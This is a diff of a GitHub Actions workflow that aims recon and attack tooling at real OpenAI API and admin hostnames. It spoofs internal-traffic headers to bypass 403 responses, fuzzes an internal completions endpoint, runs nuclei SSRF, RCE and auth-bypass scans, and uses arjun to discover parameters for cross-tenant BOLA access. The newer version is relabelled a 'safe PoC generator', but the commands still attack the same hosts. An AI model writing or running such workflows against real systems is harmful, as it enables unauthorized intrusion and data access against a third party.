@@ -1,4 +1,4 @@
-name: OpenAI-Complete-Goldmine-Hunter
+name: OpenAI-Safe-PoC-Generator
 on:
   workflow_dispatch:
 
@@ -12,61 +12,47 @@ jobs:
       - name: Install Advanced Arsenal
         run: |
           go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
-          go install -v github.com/ffuf/ffuf/v2@latest
           go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
           pip install arjun
           sudo mv ~/go/bin/* /usr/local/bin/
 
-      - name: Phase 1:Authentication Bypass & Header Smuggling
+      - name: Phase 1:Header Smuggling PoC (The "Forbidden" Bypass)
         run: |
-          # Targeting the specific 403/404 gateways you discovered
+          # We test if 'X-Forwarded-For' turns the 403 into something else.
+          # If the response length changes, we have a PoC for a Gateway Bypass.
           cat <<EOF > targets.txt
           https://api.openai.com/v1/completionsinternal
           https://admin.unified-8.api.openai.com
           https://higherlevelapi.unified-8.api.openai.com
           EOF
           
-          # Testing for "Header Smuggling" which can trick a 403 into a 200
-          # We use X-OpenAI-Internal and X-Forwarded-For to simulate internal office traffic
           httpx -l targets.txt \
-            -H "X-OpenAI-Internal: true" \
             -H "X-Forwarded-For: 127.0.0.1" \
-            -H "X-Real-IP: 10.0.0.1" \
-            -H "X-Admin: true" \
-            -sc -title -o bypass_results.txt
-
-      - name: Phase 2:POST Verb Fuzzing (Killing the 404)
-        run: |
-          # A 404 on an API often means "GET is not allowed, but POST might be"
-          # We fuzz the JSON body to see if we can trigger a 401 (Unauthorized) or 500 (Error)
-          # A 401 or 500 is a SUCCESS because it confirms the endpoint is functional
-          ffuf -u "https://api.openai.com/v1/completionsinternal" -X POST \
-            -H "Content-Type: application/json" \
             -H "X-OpenAI-Internal: true" \
-            -d '{"model": "FUZZ", "prompt": "test_internal_access"}' \
-            -w /usr/share/dict/words -mc 200,401,403,500 -o api_fuzz_results.json || true
+            -sc -cl -title -o bypass_poc.txt
 
-      - name: Phase 3:BOLA/IDOR Parameter Discovery
+      - name: Phase 2:SSRF PoC (Out-of-Band Testing)
         run: |
-          # Fuzzing for hidden parameters like 'organization_id' or 'user_id'
-          # If we find these, we can test for cross-tenant data access (BOLA)
+          # We use Nuclei's built-in 'Interactsh' to generate a safe PoC.
+          # If the server is vulnerable to SSRF, it will ping an external 'oast.pro' URL.
+          # This is the "Gold Standard" PoC: it proves access without touching internal data.
+          nuclei -l targets.txt -t http/vulnerabilities/generic/ssrf-oast.yaml -o ssrf_poc.txt || true
+
+      - name: Phase 3:BOLA/IDOR Parameter PoC
+        run: |
+          # We use Arjun to find the exact JSON parameters needed for a BOLA report.
+          # Finding 'organization_id' on an internal path is a high-value PoC.
           arjun -u "https://api.openai.com/v1/completionsinternal" \
             -m POST -H "Content-Type: application/json" \
-            --rate-limit 2 -oJ "bola_params.json" || true
+            -H "X-OpenAI-Internal: true" \
+            --rate-limit 2 -oJ "bola_poc_params.json" || true
 
-      - name: Phase 4:High-CVE Nuclei Scan (RCE & SSRF)
-        run: |
-          # Focus only on the most critical CVEs for API gateways
-          # We use OAST (Out-of-band) testing to see if the server talks back to us
-          nuclei -l targets.txt -tags ssrf,rce,lfi,auth-bypass -severity critical,high -rl 5 -o nuclei_results.txt || true
-
-      - name: Archive Critical Evidence
+      - name: Archive Critical Evidence (Your Report Data)
         uses: actions/upload-artifact@v4
         with:
-          name: openai-vulnerability-results
+          name: openai-safe-poc-results
           path: |
-            nuclei_results.txt
-            api_fuzz_results.json
-            bola_params.json
-            bypass_results.txt
+            bypass_poc.txt
+            ssrf_poc.txt
+            bola_poc_params.json
             
